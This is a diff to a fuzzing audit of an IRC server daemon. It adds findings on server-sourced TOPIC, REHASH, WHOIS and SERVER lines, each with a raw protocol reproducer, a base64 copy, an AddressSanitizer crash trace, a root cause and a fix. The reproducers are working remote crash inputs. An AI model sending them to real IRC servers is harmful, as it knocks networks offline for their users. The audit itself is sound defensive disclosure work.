@@ -32,11 +32,15 @@ below come from it.
 | F6 | **Critical** | `numnicks.c:358-382` `SetRemoteNumNick` + `numnicks.c:259` `RemoveYXXClient` | `N` whose numeric field is 1 char | dangling `client_list` slot, use-after-free of a pooled `Client` |
 | F5 | **High** | `channel.c:4197` (`mode_parse_ban`) + early returns in `mode_parse` (`channel.c:5271`, `5298-5301`) | `M #c +b mask <newer-ts>` during burst, or a second `B` with a newer TS and `+b` | stack `struct Ban` left linked in `chptr->banlist` (stack-use-after-return, later `free()` of a stack address) |
 | A1 | **High** | `s_user.c:1469-1472`, `s_misc.c:348-396`, `m_nick.c:403` | `BX C` alias, primary `Q`, then the alias numeric sends `N` | alias put in nick hash, never removed: **assert `list.c:334` abort**; with NDEBUG a dangling hash entry (UAF), and a hash self-loop **hang** |
-| F4 | High | `numnicks.c:136-143` `base64toint` via `findNUser` (`m_burst.c:595`) | `B #c <ts> ABAAA,:vvvvvvvv` (empty member before `:`) | out-of-bounds read of `server_list[]` → wild pointer → SEGV |
+| F4 | High | `numnicks.c:136-143` `base64toint` via `findNUser` (`m_burst.c:595`, `channel.c:4587`) | `B #c <ts> ABAAA,:vvvvvvvv` (empty member before `:`), or `ABAAA M #c -o :` (empty client-mode param) | out-of-bounds read of `server_list[]` → wild pointer → SEGV |
 | F2 | Medium | `m_burst.c:125` `netride_modes` | `B #new <ts> +k` (no key argument) | `strcmp(key, NULL)` → SEGV |
 | F3 | Medium | `parse.c:2247` `parse_server` | any line whose command is a numeric evaluating to 0: `AB 000 x`, `AB 0/: x` | `mptr == NULL` → SEGV |
 | F7 | Medium | `m_mark.c:112` `ms_mark` | `AB MK x` (fewer than 2 params) | `strcmp(NULL, ...)` → SEGV |
 | F8 | Medium | `channel.c:2870` `modebuf_flush_int` | `AB M #c -o ABAAA:1` (deop carrying an op-level) | `strptro_i == NULL` write → SEGV |
+| F11 | Medium | `m_topic.c:149` `do_settopic` (via `ms_topic m_topic.c:383`) | server-sourced `AB T #c :topic` (no setter field) | `cli_user(server)->username` → SEGV (default `HOST_IN_TOPIC`) |
+| F12 | Medium | `m_rehash.c:210` `ms_rehash` | `AB RH` (server-sourced REHASH) | `cli_user(server)` NULL → SEGV |
+| F13 | Medium | `m_server.c:751` `ms_server` | `SERVER` line whose prefix is a **user** numeric (`ABAAA S leaf ...`) | `cli_serv(user)` NULL → SEGV in `add_dlink` |
+| F14 | Medium | `m_whois.c:353-355` `do_whois` (via `ms_whois m_whois.c:617`) | server-sourced `AB W :<nick>` where the target is an oper with `+W` | `cli_user(server)->username` → SEGV |
 | F10 | Low | `parse.c:2042-2070` `parse_server` | a line starting with NUL | prefix scan steps past the terminator, so the bytes after the NUL are parsed as a server-sourced command (memory-safe: stays in the 8 KiB line buffer; it is how F6 was reached with an "empty" line) |
 | U1 | Low (UB) | `m_burst.c:577` | op-level digits `ABAAA:99999999999` in a `B` | signed overflow; the wrapped negative op-level passes the `> MAXOPLEVEL` clamp |
 | U2 | Low (UB) | `numnicks.c:479` `iptobase64` | any IPv4 address >= 128.0.0.0 | `uint16 << 16` signed-int overflow (benign on two's-complement) |
@@ -264,6 +268,17 @@ ERROR: AddressSanitizer: SEGV on unknown address 0x55e40e48b5b8
   #1 findNUser    numnicks.c:243
   #2 ms_burst     m_burst.c:595
 ```
+Second call site, `repro/mode_empty_client_param` (any chanop user on the peer):
+```
+\x01AB N n 2 1760000000 u h +i B]AAAB ABAAA :n
+ABAAA C #c 1760000000
+ABAAA M #c -o :
+```
+base64 `AUFCIE4gbiAyIDE3NjAwMDAwMDAgdSBoICtpIEJdQUFBQiBBQkFBQSA6bgpBQkFBQSBDICNjIDE3NjAwMDAwMDAKQUJBQUEgTSAjYyAtbyA6Cg==`.
+The stack is `FindNServer numnicks.c:218 ← findNUser numnicks.c:243 ← mode_parse_client channel.c:4587`.
+For remote sources, `mode_parse_client` passes the raw parameter to `findNUser`,
+and an empty trailing parameter is `""`.
+
 **Root cause.** In the member `:vvvvvvvv`, `ms_burst` (`m_burst.c:513-514`) cuts
 the nick at `:`, leaving `nick = ""`. `findNUser("")` → `FindNServer("")` →
 `base64toint("")`. `base64toint` (`numnicks.c:138`) consumes `*s++` before it
@@ -336,6 +351,88 @@ writes through `strptro_i` in the "chanop with known oplevel" branch
 remote server can also send it (`-o` of another member). **Fix.** Guard the
 second `ircd_snprintf` with `if (strptro)`, and ignore the `:level` suffix on
 `MODE_DEL` for remote sources as is already done for local ones.
+
+## F11 — server-sourced TOPIC without a setter field
+
+**Reproducer** `repro/topic_from_server`
+```
+\x01AB N n 2 1760000000 u h +i B]AAAB ABAAA :n
+AB B #c 1760000000 ABAAA
+AB T #c :new topic
+```
+base64: `AUFCIE4gbiAyIDE3NjAwMDAwMDAgdSBoICtpIEJdQUFBQiBBQkFBQSA6bgpBQiBCICNjIDE3NjAwMDAwMDAgQUJBQUEKQUIgVCAjYyA6bmV3IHRvcGljCg==`
+```
+ERROR: AddressSanitizer: SEGV on unknown address 0x000000000058
+  #0 my_strnlen / doprintf / ircd_snprintf   ircd_snprintf.c:1510
+  #3 do_settopic   m_topic.c:149
+  #4 ms_topic      m_topic.c:383
+```
+**Root cause.** `ms_topic` only takes a setter from `parv[parc-4]` when `parc > 5`.
+Otherwise `do_settopic(sptr, ...)` builds `nick!user@host` from
+`cli_user(from)` (`m_topic.c:148-149`, `FEAT_HOST_IN_TOPIC` defaults to TRUE).
+For a server source that is NULL. Any linked server, one line, on any existing
+channel. The fuzzer also reached it as `AB 4 #fuzz ...`, because the command
+trie folds each byte with `& 31`, so `4` is `T` (`parse.c:1347`). Filtering
+commands by their literal string does not catch such aliases. **Fix.** In
+`do_settopic`, use `cli_name(from)` when `!cli_user(from)` (or require a setter
+field from servers).
+
+## F12 — server-sourced REHASH
+
+**Reproducer** `repro/rehash_from_server` — `\x01AB RH` (base64 `AUFCIFJICg==`)
+```
+ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
+  #0 ms_rehash   m_rehash.c:210
+```
+**Root cause.** `ms_rehash` (`m_rehash.c:165-213`) assumes `sptr` is a user:
+`cli_name(cli_user(sptr)->server)` at `:208` and `:210`. Nothing rejects a
+server source. Note that once that is fixed, any remote source still triggers a
+real `rehash()` of this server when `NETWORK_REHASH` is on (the default), with
+no `IsOper` check on this side. That is a trust question for the operators,
+not a crash. **Fix.** `if (!IsUser(sptr)) return protocol_violation(...)` at the
+top. Consider requiring `IsOper(sptr)`.
+
+## F13 — SERVER introduced by a user
+
+**Reproducer** `repro/server_from_user`
+```
+\x01AB N n 2 1760000000 u h +i B]AAAB ABAAA :n
+ABAAA S leaf.fuzz 2 1760000000 1793289405 J10 ACA]] +h6 :leaf
+```
+base64: `AUFCIE4gbiAyIDE3NjAwMDAwMDAgdSBoICtpIEJdQUFBQiBBQkFBQSA6bgpBQkFBQSBTIGxlYWYuZnV6eiAyIDE3NjAwMDAwMDAgMTc5MzI4OTQwNSBKMTAgQUNBXV0gK2g2IDpsZWFmCg==`
+```
+ERROR: AddressSanitizer: SEGV on unknown address 0x000000000008
+  #0 add_dlink   list.c:713
+  #1 ms_server   m_server.c:751   add_dlink(&(cli_serv(sptr))->down, acptr)
+```
+**Root cause.** `ms_server` never checks that `sptr` is a server, so
+`cli_serv(sptr)` is NULL for a user prefix. The fuzzer hit it with a
+5-byte prefix `ABAA\x11` that `findNUser` resolves to user ABAAA. **Fix.**
+`if (!IsServer(sptr)) return protocol_violation(...)` (and squit the link).
+
+## F14 — server-sourced WHOIS on a `+W` oper
+
+**Reproducer** `repro/whois_from_server`
+```
+\x01AB N n 2 1760000000 u h +i B]AAAB ABAAA :n
+ABAAA M n +oW
+AB W :n
+```
+base64: `AUFCIE4gbiAyIDE3NjAwMDAwMDAgdSBoICtpIEJdQUFBQiBBQkFBQSA6bgpBQkFBQSBNIG4gK29XCkFCIFcgOm4K`
+```
+ERROR: AddressSanitizer: SEGV on unknown address 0x000000000058
+  #0 my_strnlen / doprintf          ircd_snprintf.c:1510
+  #4 msgq_vmake                     msgq.c:345
+  #6 sendcmdto_one                  send.c
+  #7 do_whois                       m_whois.c:353
+  #8 ms_whois                       m_whois.c:617
+```
+**Root cause.** `ms_whois` accepts any source. `do_whois` tells a `+W` oper
+target who asked, formatting `cli_user(sptr)->username/host`
+(`m_whois.c:352-355`), and `cli_user(server)` is NULL. Other `send_reply(sptr, ...)`
+calls in `do_whois` also assume a user asker. Opers commonly set `+W`, and the
+target can be local or remote. **Fix.** In `ms_whois`, drop or reject
+non-user sources: `if (!IsUser(sptr)) return 0;`.
 
 ## F10 — NUL in the prefix position
 
